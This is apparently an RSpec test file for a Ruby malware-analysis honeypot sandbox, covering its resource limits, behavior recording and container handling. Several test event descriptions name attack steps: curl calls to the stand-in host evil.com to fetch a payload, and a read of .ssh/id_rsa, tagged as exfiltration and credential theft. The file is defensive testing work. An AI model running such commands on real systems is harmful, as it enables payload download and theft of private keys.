# frozen_string_literal: true

require "rspec"
require "json"
require "tmpdir"
require "fileutils"

require_relative "../sandbox/container_manager"
require_relative "../sandbox/resource_limiter"
require_relative "../sandbox/behavior_recorder"

RSpec.describe RubyGuardian::Honeypot::Sandbox do
  let(:logger) { Logger.new(File::NULL) }

  describe RubyGuardian::Honeypot::Sandbox::ResourceLimiter do
    describe "#initialize" do
      it "uses default limits" do
        limiter = described_class.new
        expect(limiter.limits[:memory]).to eq("256m")
        expect(limiter.limits[:cpus]).to eq("0.5")
        expect(limiter.limits[:pids_limit]).to eq(64)
      end

      it "accepts custom overrides" do
        limiter = described_class.new(memory: "512m", cpus: "1.0")
        expect(limiter.limits[:memory]).to eq("512m")
        expect(limiter.limits[:cpus]).to eq("1.0")
      end

      it "supports named profiles" do
        minimal = described_class.new(profile: :minimal)
        expect(minimal.limits[:cpus]).to eq("0.25")
        expect(minimal.limits[:memory]).to eq("128m")

        intensive = described_class.new(profile: :intensive)
        expect(intensive.limits[:cpus]).to eq("2.0")
        expect(intensive.limits[:memory]).to eq("1g")
      end

      it "validates CPU range" do
        expect { described_class.new(cpus: "0.01") }.to raise_error(ArgumentError, /CPUs must be/)
        expect { described_class.new(cpus: "10.0") }.to raise_error(ArgumentError, /CPUs must be/)
      end

      it "validates memory minimum" do
        expect { described_class.new(memory: "1m") }.to raise_error(ArgumentError, /Memory must be at least/)
      end

      it "validates PID limit range" do
        expect { described_class.new(pids_limit: 2) }.to raise_error(ArgumentError, /PID limit/)
        expect { described_class.new(pids_limit: 5000) }.to raise_error(ArgumentError, /PID limit/)
      end
    end

    describe "#to_docker_args" do
      it "returns an array of Docker CLI arguments" do
        limiter = described_class.new
        args = limiter.to_docker_args
        expect(args).to be_an(Array)
        expect(args).to include("--cpus", "--memory", "--pids-limit", "--network")
      end

      it "includes correct CPU values" do
        limiter = described_class.new(cpus: "1.0", cpu_shares: 512)
        args = limiter.to_docker_args
        cpu_idx = args.index("--cpus")
        expect(args[cpu_idx + 1]).to eq("1.0")
      end

      it "includes ulimit settings" do
        limiter = described_class.new
        args = limiter.to_docker_args
        ulimit_indices = args.each_index.select { |i| args[i] == "--ulimit" }
        expect(ulimit_indices.size).to eq(3)
      end
    end

    describe "#to_cgroup_config" do
      it "returns a structured cgroup configuration" do
        limiter = described_class.new
        config = limiter.to_cgroup_config

        expect(config).to have_key(:cpu)
        expect(config).to have_key(:memory)
        expect(config).to have_key(:pids)
        expect(config).to have_key(:blkio)
        expect(config[:pids][:max]).to eq(64)
      end

      it "converts memory string to bytes" do
        limiter = described_class.new(memory: "256m")
        config = limiter.to_cgroup_config
        expect(config[:memory][:limit]).to eq(256 * 1024 * 1024)
      end
    end

    describe "#to_s" do
      it "returns a human-readable summary" do
        limiter = described_class.new
        output = limiter.to_s
        expect(output).to include("Resource Limits:")
        expect(output).to include("CPU:")
        expect(output).to include("Memory:")
        expect(output).to include("PIDs:")
      end
    end
  end

  describe RubyGuardian::Honeypot::Sandbox::BehaviorRecorder do
    let(:output_dir) { Dir.mktmpdir("rg_behavior_test") }
    let(:sample_id) { "test-sample-bhv-001" }

    subject(:recorder) do
      described_class.new(sample_id: sample_id, output_dir: output_dir, logger: logger)
    end

    after { FileUtils.rm_rf(output_dir) }

    describe "#start! and #stop!" do
      it "tracks recording start time" do
        recorder.start!
        expect(recorder.started_at).to be_a(Time)
      end

      it "generates output files on stop" do
        recorder.start!
        recorder.record_event(category: :process_execution, description: "test event")
        recorder.stop!

        expect(Dir.glob(File.join(output_dir, "*.json")).size).to be >= 3
      end
    end

    describe "#record_event" do
      before { recorder.start! }

      it "records events with required fields" do
        event = recorder.record_event(
          category: :process_execution,
          description: "Executed curl http://evil.com",
          severity: :high
        )

        expect(event[:id]).to eq(1)
        expect(event[:category]).to eq(:process_execution)
        expect(event[:severity]).to eq(:high)
        expect(event[:severity_score]).to eq(3)
        expect(event[:description]).to include("curl")
      end

      it "raises on unknown category" do
        expect {
          recorder.record_event(category: :fake_category, description: "test")
        }.to raise_error(RuntimeError, /Unknown category/)
      end

      it "raises when recording not started" do
        fresh = described_class.new(sample_id: "x", output_dir: output_dir, logger: logger)
        expect {
          fresh.record_event(category: :file_access, description: "test")
        }.to raise_error(RuntimeError, /not started/)
      end

      it "accumulates events in order" do
        recorder.record_event(category: :file_access, description: "first")
        recorder.record_event(category: :network_connection, description: "second")
        recorder.record_event(category: :credential_access, description: "third")

        expect(recorder.events.size).to eq(3)
        expect(recorder.events.map { |e| e[:id] }).to eq([1, 2, 3])
      end
    end

    describe "#timeline" do
      before { recorder.start! }

      it "returns events sorted by timestamp" do
        recorder.record_event(category: :process_execution, description: "first")
        recorder.record_event(category: :file_access, description: "second")

        tl = recorder.timeline
        expect(tl.size).to eq(2)
        expect(tl.first[:description]).to eq("first")
      end
    end

    describe "#summary" do
      before { recorder.start! }

      it "computes risk score from events" do
        recorder.record_event(category: :credential_access, description: "stole creds", severity: :critical)
        recorder.record_event(category: :network_connection, description: "exfil data", severity: :critical)
        recorder.record_event(category: :process_execution, description: "ran command", severity: :medium)

        summary = recorder.summary
        expect(summary[:total_events]).to eq(3)
        expect(summary[:risk_score]).to be > 0
        expect(summary[:max_severity]).to eq(:critical)
        expect(summary[:events_by_category]).to include(:credential_access => 1, :network_connection => 1)
      end

      it "auto-tags events based on content" do
        recorder.record_event(category: :process_execution, description: "Executed curl http://evil.com/payload")
        recorder.record_event(category: :credential_access, description: "Read .ssh/id_rsa")

        summary = recorder.summary
        expect(summary[:tags]).to include("data_exfiltration")
        expect(summary[:tags]).to include("credential_theft")
      end
    end
  end

  describe RubyGuardian::Honeypot::Sandbox::ContainerManager do
    let(:workspace_dir) { Dir.mktmpdir("rg_container_test") }

    subject(:manager) do
      described_class.new(workspace_dir: workspace_dir, logger: logger)
    end

    after { FileUtils.rm_rf(workspace_dir) }

    describe "#initialize" do
      it "starts with no active containers" do
        expect(manager.active_containers).to be_empty
      end
    end

    describe "#list_active" do
      it "returns empty array when no containers running" do
        expect(manager.list_active).to be_empty
      end
    end

    describe "#destroy_all" do
      it "does not raise when no containers exist" do
        expect { manager.destroy_all }.not_to raise_error
      end
    end

    describe "#collect_results" do
      it "returns nil for unknown sample" do
        expect(manager.collect_results("nonexistent")).to be_nil
      end
    end

    describe "sample validation" do
      it "rejects nonexistent sample files" do
        expect {
          manager.run_sample(sample_path: "/nonexistent/sample.rb")
        }.to raise_error(RuntimeError, /not found/)
      end

      it "rejects samples exceeding size limit" do
        large_file = File.join(workspace_dir, "large_sample.rb")
        File.write(large_file, "x" * (11 * 1024 * 1024))

        expect {
          manager.run_sample(sample_path: large_file)
        }.to raise_error(RuntimeError, /too large/)
      end
    end
  end
end
